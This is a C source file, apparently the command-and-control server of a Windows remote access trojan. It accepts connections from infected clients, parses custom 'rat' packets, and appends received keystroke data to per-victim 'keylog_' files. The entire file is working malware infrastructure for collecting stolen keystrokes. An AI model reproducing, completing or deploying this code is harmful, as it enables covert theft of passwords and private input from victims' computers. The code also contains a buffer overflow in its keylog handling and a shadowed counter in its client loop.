#include "clients_manager.h"

#include "log.h"
#include "net_util.h"

#include <minwindef.h>
#include <stdio.h>
#include <stdlib.h>
#include <synchapi.h>

#define KEYLOG_PREFIX_LEN 7

static void create_keylog(FILE **f, char *name) {
  char modded_name[KEYLOG_PREFIX_LEN + ADDR_LEN] = "keylog_";
  for (char *cur = modded_name + KEYLOG_PREFIX_LEN; *name; cur++, name++) {
    *cur = (*name == '.') ? '-' : *name;
  }
  fopen_s(f, modded_name, "a");
}

DWORD WINAPI accept_clients(LPVOID lpParameter) {
  LOG_DEBUG("accepting a connection");
  Server *server = (Server *)lpParameter;
  int conn_count = 0;
  int client_index = 0;
  SocketAddress saddr;
  while (server->conn != INVALID_SOCKET) {
    while (conn_count == MAX_CLIENTS) {
      LOG_DEBUG("clients full");
      Sleep(1000 * 60); // sleep for a minute
      for (int i = 0, conn_count = 0; i < MAX_CLIENTS; i++) {
        if (server->clients[i].conn != INVALID_SOCKET) {
          ++conn_count;
        } else {
          client_index = i;
        }
      }
    }
    LOG_DEBUG("waiting for client");
    server->clients[client_index].conn =
        accept(server->conn, (void *)&saddr, NULL);
    if (server->clients[client_index].conn == INVALID_SOCKET) {
      LOG_ERR("accept failed, error: %d", WSAGetLastError());
      closesocket(server->conn);
      server->conn = INVALID_SOCKET;
      break;
    }
    LOG_DEBUG("accepted");
    InetNtop(AF_INET, (void *)&saddr, server->clients[client_index].addr,
             ADDR_LEN);
    ++conn_count;
    server->clients[client_index].handler = create_thread(client_input_handler, server->clients + client_index);
    ++client_index;
  }
  
  return 0;
}

DWORD WINAPI client_input_handler(LPVOID lpParameter) {
  LOG_DEBUG();
  Client *client_info = (Client *)lpParameter;
  SOCKET client = client_info->conn;
  FILE *keylog;
  create_keylog(&keylog, client_info->addr);
  char client_buf[DEFAULT_KEYLOG_BUFLEN];
  ratpacket_t *p = (ratpacket_t *)client_buf;
  int allocated = 0;
  while (1) {
    int recbytes = recv(client, (char *)p, sizeof(*p), 0);
    if (recbytes == 0) {
      LOG_DEBUG("connection closed");
      goto exit;
    }
    if (recbytes < 0) {
      LOG_ERR("recv failed with %d", WSAGetLastError());
      goto exit;
    }
    switch (p->op) {
    case RAT_PACKET_ECHO:
      allocated = p->data_len > RAT_DATA_SIZE;
      if (allocated) {
        ratpacket_t *p_dynamic = malloc(sizeof(*p) + p->data_len);
        if (!p_dynamic) {
          LOG_ERR("malloc failed");
          goto exit;
        }
        p_dynamic->op = p->op;
        p_dynamic->data_len = p->data_len;
        p = p_dynamic;
      }
      recbytes = recv(client, (char *)p->data, p->data_len, 0);
      if (recbytes == 0) {
        LOG_DEBUG("connection closed");
        break;
      }
      if (recbytes < 0) {
        LOG_ERR("recv failed with %d", WSAGetLastError());
        break;
      }
      printf("%s", p->data);
      break;
    case RAT_PACKET_KEYLOG:
      LOG_DEBUG("keylog");
      recbytes = recv(client, (char *)p->data, p->data_len, 0);
      fwrite(p->data, 1, p->data_len, keylog);
      break;
    default:
      LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
                p->op);
      break;
    }
    if (allocated) {
      free(p);
      p = (ratpacket_t *)client_buf;
      allocated = 0;
    }
  }
exit:
  fclose(keylog);
  return 0;
}
